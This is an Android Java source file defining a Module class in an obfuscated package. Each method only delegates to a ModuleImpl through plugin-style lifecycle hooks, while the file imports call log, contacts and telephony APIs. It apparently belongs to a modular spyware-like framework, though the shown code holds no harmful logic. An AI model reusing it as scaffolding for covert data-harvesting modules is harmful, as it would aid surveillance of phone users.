package zer0.x985d2fcb;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

public class Module
{
	private final ModuleImpl _impl;

	public Module()
	{
		_impl = new ModuleImpl(this);
	}

    public int getVersion()
    {
        return 0x00000001;
    }

    public int getHash()
    {
        return 	_impl.getHash();
    }

	public int getState()
	{
		return 1;
	}

	public void onInit(Object zRuntime)
	{
		_impl.onInit(zRuntime);
	}
	
	public void onLoad()
	{
        _impl.onLoad();
	}

    public void onUnload()
    {
		_impl.onUnload();
    }

	public void doCommonJob(final long currentMillis)
	{
        _impl.doCommonJob(currentMillis);
	}
}